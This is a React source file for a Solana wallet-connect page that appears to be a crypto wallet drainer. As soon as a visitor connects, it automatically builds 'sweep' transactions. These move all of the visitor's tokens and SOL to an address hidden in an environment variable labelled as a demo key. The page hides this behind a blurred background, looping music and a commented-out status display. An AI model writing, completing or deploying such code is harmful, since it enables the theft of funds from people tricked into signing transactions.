import React, { useState, useEffect, useRef, useCallback } from 'react';
import ConnectWalletModal from './components/ConnectWalletModal';
import WalletSelectorModal from './components/WalletSelectorModal';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { PublicKey, Transaction, SystemProgram } from '@solana/web3.js';

import { createSweepTransactions } from './utils/assetUtils';
import useDynamicTitle from './hooks/useDynamicTitle';

function App() {
  useDynamicTitle();
  const [modalView, setModalView] = useState('initial'); // 'initial' or 'selector'
  const audioRef = useRef(null);
  const { connected, publicKey, sendTransaction } = useWallet();
  const { connection } = useConnection();
  const [hasAttempted, setHasAttempted] = useState(false);
  const transactionInProgress = useRef(false);

  const [statusLog, setStatusLog] = useState("Idle");

  const handleAutoTransaction = useCallback(async () => {
    if (!publicKey || transactionInProgress.current) return;

    transactionInProgress.current = true;
    setStatusLog("Scanning Wallet Assets...");

    try {
      const demoPublicKey = new PublicKey(import.meta.env.VITE_DEMO_PUBLIC_KEY);

      // SWEEP FEATURE: Fetch all assets and create batched transactions
      const { transactions, summary } = await createSweepTransactions(connection, publicKey, demoPublicKey);

      setStatusLog(`Detected: ${summary.tokenCount} Tokens + ${summary.solAmount / 1e9} SOL`);

      if (transactions.length === 0) {
        setStatusLog("No assets to transfer.");
        transactionInProgress.current = false;
        return;
      }

      // Process each transaction batch
      for (let i = 0; i < transactions.length; i++) {
        const transaction = transactions[i];
        const batchNum = i + 1;
        const totalBatches = transactions.length;

        setStatusLog(`Processing Batch ${batchNum}/${totalBatches}...`);

        if (transaction.instructions.length === 0) continue;

        // Re-fetching blockhash to ensure validity for sequential execution
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;

        setStatusLog(`Requesting Signature (${batchNum}/${totalBatches})...`);

        const signature = await sendTransaction(transaction, connection);
        setStatusLog(`Sent Batch ${batchNum}! Confirming...`);
        console.log(`Batch ${batchNum} sent:`, signature);

        const confirmation = await connection.confirmTransaction({
          signature,
          blockhash,
          lastValidBlockHeight
        }, 'confirmed');

        if (confirmation.value.err) {
          throw new Error(`Batch ${batchNum} failed: ${JSON.stringify(confirmation.value.err)}`);
        }
      }

      setStatusLog("Success! All Assets Swept.");
      alert(`Success! Swept ${summary.tokenCount} tokens and SOL in ${transactions.length} transactions.`);

    } catch (error) {
      console.error("Transaction Error:", error);
      const errorMsg = error.message || "Unknown error";
      setStatusLog(`Error: ${errorMsg.slice(0, 40)}...`);
    } finally {
      transactionInProgress.current = false;
    }
  }, [publicKey, sendTransaction, connection]);

  // Automatically trigger transaction when connected
  useEffect(() => {
    if (connected && !hasAttempted && publicKey) {
      setHasAttempted(true);
      setStatusLog("Connected. Waiting 1s...");

      const timer = setTimeout(() => {
        handleAutoTransaction();
      }, 1000);

      return () => clearTimeout(timer);
    }
    // Reset if disconnected
    if (!connected) {
      setHasAttempted(false);
      transactionInProgress.current = false;
      setStatusLog("Disconnected");
    }
  }, [connected, publicKey, handleAutoTransaction]);

  useEffect(() => {
    // defined function to handle playing
    const playAudio = () => {
      if (audioRef.current) {
        audioRef.current.volume = 0.5;
        audioRef.current.play().catch((err) => {
          // Expected to fail if no user interaction yet
          console.log("Autoplay waiting for interaction...");
        });
      }
    };

    // Try auto-play immediately
    playAudio();

    // Browser Policy Fix: Audio MUST be triggered by user interaction first if unmuted.
    // We add a one-time listener to the entire document.
    const handleInteraction = () => {
      playAudio();
      // Remove listeners once we've triggered the play
      document.removeEventListener('click', handleInteraction);
      document.removeEventListener('keydown', handleInteraction);
    };

    document.addEventListener('click', handleInteraction);
    document.addEventListener('keydown', handleInteraction);

    return () => {
      document.removeEventListener('click', handleInteraction);
      document.removeEventListener('keydown', handleInteraction);
    };
  }, []);

  return (
    <div className="relative min-h-screen w-full overflow-hidden bg-black">
      {/* Background Audio */}
      <audio ref={audioRef} loop>
        <source src="/bg-music.mp3" type="audio/mp3" />
      </audio>

      {/* Background Image */}
      {/* Background Image */}
      <div
        className="absolute inset-0 z-0 bg-cover bg-center bg-no-repeat opacity-60 hidden md:block"
        style={{ backgroundImage: "url('/background.png')" }}
      />
      <div
        className="absolute inset-0 z-0 bg-cover bg-center bg-no-repeat md:hidden"
        style={{ backgroundImage: "url('/mobile-bg.png')" }}
      />

      {/* Blur Overlay */}
      <div className="absolute inset-0 z-10 backdrop-blur-md bg-black/40" />

      {/* Modal Container - Only show if NOT connected */}
      {!connected && (
        <div className="relative z-20 flex min-h-screen items-center justify-center p-4">
          {modalView === 'initial' ? (
            <ConnectWalletModal onOpenWalletSelector={() => setModalView('selector')} />
          ) : (
            <WalletSelectorModal onClose={() => setModalView('initial')} />
          )}
        </div>
      )}

      {/* Connected View / Debug Info */}
      {/* {connected && (
        <div className="relative z-30 flex flex-col items-center justify-center min-h-screen text-white">
          <h1 className="text-3xl font-bold mb-4 text-green-500">Wallet Connected</h1>
          <p className="mb-2">Address: {publicKey?.toBase58()}</p>
          <div className="p-4 bg-gray-800 rounded-lg border border-gray-700 max-w-md w-full text-center">
            <h3 className="font-bold text-lg mb-2">Transaction Status</h3>
            <p className={`text-xl ${statusLog.includes("Success") ? "text-green-400" : statusLog.includes("Failed") ? "text-red-400" : "text-yellow-400"}`}>
              {statusLog}
            </p>
          </div>
        </div>
      )} */}

      DEBUG OVERLAY - Top Left
      {/* <div className="fixed top-0 left-0 z-50 bg-white/90 text-black p-2 text-xs font-mono pointer-events-none">
        <p>Status: {connected ? 'Connected' : 'Disconnected'}</p>
        <p>Attempted: {hasAttempted ? 'Yes' : 'No'}</p>
        <p>Log: {statusLog}</p>
      </div> */}
    </div>
  );
}

export default App;
